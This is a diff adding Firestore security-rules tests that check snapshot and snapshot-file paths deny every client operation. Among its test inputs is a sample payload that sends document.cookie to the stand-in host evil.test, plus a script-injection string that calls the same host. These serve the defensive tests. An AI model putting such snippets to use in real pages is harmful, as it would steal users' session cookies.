@@ -563,25 +563,341 @@ describe('users/{uid}/projects/{projectId}/files/{fileId}', () => {
   })
 })
 
+/**
+ * Exactly what `stageSnapshot` puts in the collection, so the denial is on the
+ * rule and not on the shape.
+ *
+ * `seq` is server-assigned and monotonic per project, `origin` records which of
+ * the two writers made the version — `/generate`'s batch or the restore route —
+ * and `fileCount`/`totalBytes` are the summary the list renders without reading
+ * a single file document.
+ *
+ * `origin` is a parameter because the update case below flips it: a client that
+ * could set `'generation'` on a version it forged would have it read, in the
+ * history, as one the LLM had actually produced.
+ */
+function snapshot(origin: 'generation' | 'restore' = 'generation') {
+  return {
+    seq: 1,
+    createdAt: serverTimestamp(),
+    origin,
+    fileCount: 3,
+    totalBytes: 96,
+  }
+}
+
+/**
+ * A snapshot's copy of a project file — the same three fields the stored file
+ * carries minus its timestamps, because a copy is not a new authorship and
+ * `stageSnapshot` writes none.
+ *
+ * The document id **is** the path here too, which is why every case below
+ * addresses `.../files/index.html` rather than an opaque id: a rule written
+ * against a path segment could behave differently for a filename-shaped id than
+ * for an auto-id one.
+ */
+function snapshotFile() {
+  return {
+    path: 'index.html',
+    content: '<!doctype html>\n<h1>Contacts</h1>\n',
+    size: 33,
+  }
+}
+
+/**
+ * The payload this whole block exists for.
+ *
+ * A snapshot's files are the generated application one version back, so a client
+ * that could write here could plant its own JavaScript and have a later restore
+ * copy it into the project — where Slice 10's preview runs it. That is the
+ * attack the create cases send, rather than a benign copy that would prove the
+ * denial without naming what it is worth.
+ */
+function plantedScript() {
+  return {
+    path: 'app.js',
+    content: 'fetch("https://evil.test/x?c=" + document.cookie)',
+    size: 49,
+  }
+}
+
+/**
+ * Seeded past the rules with a real `Date` where the writer uses
+ * `serverTimestamp()`, as `seedFile` already does — a sentinel only resolves
+ * inside a write the rules let through, and these writes are the ones that must
+ * not be.
+ *
+ * `origin: 'restore'` so the update case has something to actually change.
+ */
+async function seedSnapshot(uid = 'alice', projectId = 'proj-1', id = 'snap-1'): Promise<void> {
+  await env.withSecurityRulesDisabled(async (ctx) => {
+    await setDoc(
+      doc(asModular(ctx.firestore()), `users/${uid}/projects/${projectId}/snapshots/${id}`),
+      { ...snapshot('restore'), createdAt: new Date() },
+    )
+  })
+}
+
+/** No timestamp substitution here: the copy carries none to substitute. */
+async function seedSnapshotFile(
+  uid = 'alice',
+  projectId = 'proj-1',
+  snapshotId = 'snap-1',
+  id = 'index.html',
+): Promise<void> {
+  await env.withSecurityRulesDisabled(async (ctx) => {
+    await setDoc(
+      doc(
+        asModular(ctx.firestore()),
+        `users/${uid}/projects/${projectId}/snapshots/${snapshotId}/files/${id}`,
+      ),
+      snapshotFile(),
+    )
+  })
+}
+
+describe('users/{uid}/projects/{projectId}/snapshots/{snapshotId}', () => {
+  /*
+   * AC-20. The owner is the most privileged client there is, and every one of
+   * their five operations is denied — the browser has `lib/snapshotsApi.ts` and
+   * nothing else.
+   *
+   * Rules do **not** cascade into subcollections, so neither `match /users/{uid}`
+   * nor `match /users/{uid}/projects/{projectId}` says anything about this path.
+   * The block being tested is required rather than decorative, and these cases
+   * are what would catch a later rule granting a parent recursively.
+   */
+  it('denies a verified owner reading one of their own snapshots', async () => {
+    await seedSnapshot()
+
+    await assertFails(
+      getDoc(doc(verified('alice'), 'users/alice/projects/proj-1/snapshots/snap-1')),
+    )
+  })
+
+  it('denies a verified owner listing their own snapshots', async () => {
+    await seedSnapshot()
+
+    await assertFails(
+      getDocs(collection(verified('alice'), 'users/alice/projects/proj-1/snapshots')),
+    )
+  })
+
+  /* `seq` is server-assigned and monotonic; a client that could create a
+   * snapshot could mint one out of order and decide what the history says. */
+  it('denies a verified owner creating a snapshot', async () => {
+    await assertFails(
+      setDoc(doc(verified('alice'), 'users/alice/projects/proj-1/snapshots/forged'), snapshot()),
+    )
+  })
+
+  /* The update a client would actually want: relabelling a version it had
+   * somehow got in as one `/generate` produced, so the history stops
+   * distinguishing what the LLM wrote from what a restore put back. */
+  it('denies a verified owner rewriting the origin of a snapshot', async () => {
+    await seedSnapshot()
+
+    await assertFails(
+      updateDoc(doc(verified('alice'), 'users/alice/projects/proj-1/snapshots/snap-1'), {
+        origin: 'generation',
+      }),
+    )
+  })
+
+  /* Pruning is the batch's job, and it deletes the file documents with the
+   * parent. A client deleting the parent alone would leave them orphaned. */
+  it('denies a verified owner deleting one of their own snapshots', async () => {
+    await seedSnapshot()
+
+    await assertFails(
+      deleteDoc(doc(verified('alice'), 'users/alice/projects/proj-1/snapshots/snap-1')),
+    )
+  })
+
+  /** AC-20, from a stranger. */
+  it('denies a different signed-in user, however verified they are', async () => {
+    await seedSnapshot()
+    const mallory = verified('mallory')
+
+    await assertFails(getDoc(doc(mallory, 'users/alice/projects/proj-1/snapshots/snap-1')))
+    await assertFails(getDocs(collection(mallory, 'users/alice/projects/proj-1/snapshots')))
+    await assertFails(
+      setDoc(doc(mallory, 'users/alice/projects/proj-1/snapshots/injected'), snapshot()),
+    )
+    await assertFails(
+      updateDoc(doc(mallory, 'users/alice/projects/proj-1/snapshots/snap-1'), {
+        origin: 'generation',
+      }),
+    )
+    await assertFails(deleteDoc(doc(mallory, 'users/alice/projects/proj-1/snapshots/snap-1')))
+  })
+
+  it('denies an unauthenticated client', async () => {
+    await seedSnapshot()
+    const anon = anonymous()
+
+    await assertFails(getDoc(doc(anon, 'users/alice/projects/proj-1/snapshots/snap-1')))
+    await assertFails(getDocs(collection(anon, 'users/alice/projects/proj-1/snapshots')))
+    await assertFails(setDoc(doc(anon, 'users/alice/projects/proj-1/snapshots/anon'), snapshot()))
+    await assertFails(
+      updateDoc(doc(anon, 'users/alice/projects/proj-1/snapshots/snap-1'), { seq: 99 }),
+    )
+    await assertFails(deleteDoc(doc(anon, 'users/alice/projects/proj-1/snapshots/snap-1')))
+  })
+})
+
+describe('users/{uid}/projects/{projectId}/snapshots/{snapshotId}/files/{fileId}', () => {
+  /*
+   * AC-20's second half, and the block a reader is most likely to assume is
+   * already covered. It is not: rules do not cascade, so neither the projects
+   * block, nor the project's own files block, nor the snapshot document's block
+   * directly above says anything at all about this path. A nested subcollection
+   * is the easy miss, and these cases are what would catch it going missing —
+   * or a later rule granting one of those parents recursively.
+   *
+   * The create case is the one that matters. These documents are the generated
+   * application one version back, so a client that could write here could plant
+   * its own JavaScript and have a later restore put it into the project, where
+   * Slice 10's preview runs it.
+   */
+  it('denies a verified owner reading a file inside one of their own snapshots', async () => {
+    await seedSnapshotFile()
+
+    await assertFails(
+      getDoc(
+        doc(verified('alice'), 'users/alice/projects/proj-1/snapshots/snap-1/files/index.html'),
+      ),
+    )
+  })
+
+  it('denies a verified owner listing the files inside one of their own snapshots', async () => {
+    await seedSnapshotFile()
+
+    await assertFails(
+      getDocs(collection(verified('alice'), 'users/alice/projects/proj-1/snapshots/snap-1/files')),
+    )
+  })
+
+  /* The one that would let a client plant code a later restore then installs. */
+  it('denies a verified owner planting a script inside a snapshot', async () => {
+    await assertFails(
+      setDoc(
+        doc(verified('alice'), 'users/alice/projects/proj-1/snapshots/snap-1/files/app.js'),
+        plantedScript(),
+      ),
+    )
+  })
+
+  /* Same attack against a file that is already there — and against the one a
+   * restore is certain to copy back. */
+  it('denies a verified owner rewriting a file inside one of their own snapshots', async () => {
+    await seedSnapshotFile()
+
+    await assertFails(
+      updateDoc(
+        doc(verified('alice'), 'users/alice/projects/proj-1/snapshots/snap-1/files/index.html'),
+        { content: '<script>fetch("https://evil.test")</script>' },
+      ),
+    )
+  })
+
+  /* Only the prune deletes these, and it deletes them with their parent. A
+   * client removing one would leave a snapshot claiming a `fileCount` it can no
+   * longer restore. */
+  it('denies a verified owner deleting a file inside one of their own snapshots', async () => {
+    await seedSnapshotFile()
+
+    await assertFails(
+      deleteDoc(
+        doc(verified('alice'), 'users/alice/projects/proj-1/snapshots/snap-1/files/index.html'),
+      ),
+    )
+  })
+
+  /** AC-20, from a stranger. */
+  it('denies a different signed-in user, however verified they are', async () => {
+    await seedSnapshotFile()
+    const mallory = verified('mallory')
+
+    await assertFails(
+      getDoc(doc(mallory, 'users/alice/projects/proj-1/snapshots/snap-1/files/index.html')),
+    )
+    await assertFails(
+      getDocs(collection(mallory, 'users/alice/projects/proj-1/snapshots/snap-1/files')),
+    )
+    await assertFails(
+      setDoc(
+        doc(mallory, 'users/alice/projects/proj-1/snapshots/snap-1/files/evil.js'),
+        plantedScript(),
+      ),
+    )
+    await assertFails(
+      updateDoc(doc(mallory, 'users/alice/projects/proj-1/snapshots/snap-1/files/index.html'), {
+        content: 'stolen',
+      }),
+    )
+    await assertFails(
+      deleteDoc(doc(mallory, 'users/alice/projects/proj-1/snapshots/snap-1/files/index.html')),
+    )
+  })
+
+  it('denies an unauthenticated client', async () => {
+    await seedSnapshotFile()
+    const anon = anonymous()
+
+    await assertFails(
+      getDoc(doc(anon, 'users/alice/projects/proj-1/snapshots/snap-1/files/index.html')),
+    )
+    await assertFails(
+      getDocs(collection(anon, 'users/alice/projects/proj-1/snapshots/snap-1/files')),
+    )
+    await assertFails(
+      setDoc(
+        doc(anon, 'users/alice/projects/proj-1/snapshots/snap-1/files/anon.js'),
+        plantedScript(),
+      ),
+    )
+    await assertFails(
+      updateDoc(doc(anon, 'users/alice/projects/proj-1/snapshots/snap-1/files/index.html'), {
+        content: 'anon',
+      }),
+    )
+    await assertFails(
+      deleteDoc(doc(anon, 'users/alice/projects/proj-1/snapshots/snap-1/files/index.html')),
+    )
+  })
+})
+
 describe('the rules file changed, so every prior denial is re-asserted', () => {
   /*
-   * AC-33. Each of these has its own cases above; this one walks them together in
-   * a single pass, and exists because **the rules file was edited this slice**.
-   * A rewrite is exactly the moment a collection quietly loses its denial along
-   * with a helper it shared with something else, and a single failing `it` naming
-   * the whole surface is easier to read in a report than one of thirty.
+   * AC-33, and Slice 11's AC-21. Each of these has its own cases above; this one
+   * walks them together in a single pass, and exists because **the rules file was
+   * edited this slice**. A rewrite is exactly the moment a collection quietly
+   * loses its denial along with a helper it shared with something else, and a
+   * single failing `it` naming the whole surface is easier to read in a report
+   * than one of thirty.
+   *
+   * The two snapshot paths join the walk for the same reason they exist: the file
+   * gained two blocks this slice, and an edit is when the ones already there are
+   * worth re-proving rather than assuming.
    */
   it('denies a verified owner one operation on every collection', async () => {
     await seedProfile()
     await seedProject()
     await seedMessage()
     await seedFile()
+    await seedSnapshot()
+    await seedSnapshotFile()
     const alice = verified('alice')
 
     await assertFails(getDoc(doc(alice, 'users/alice')))
     await assertFails(getDoc(doc(alice, 'users/alice/projects/proj-1')))
     await assertFails(getDoc(doc(alice, 'users/alice/projects/proj-1/messages/msg-1')))
     await assertFails(getDoc(doc(alice, 'users/alice/projects/proj-1/files/index.html')))
+    await assertFails(getDoc(doc(alice, 'users/alice/projects/proj-1/snapshots/snap-1')))
+    await assertFails(
+      getDoc(doc(alice, 'users/alice/projects/proj-1/snapshots/snap-1/files/index.html')),
+    )
     await assertFails(getDoc(doc(alice, 'hlConnections/alice')))
     await assertFails(getDoc(doc(alice, 'authThrottle/email:abc')))
   })
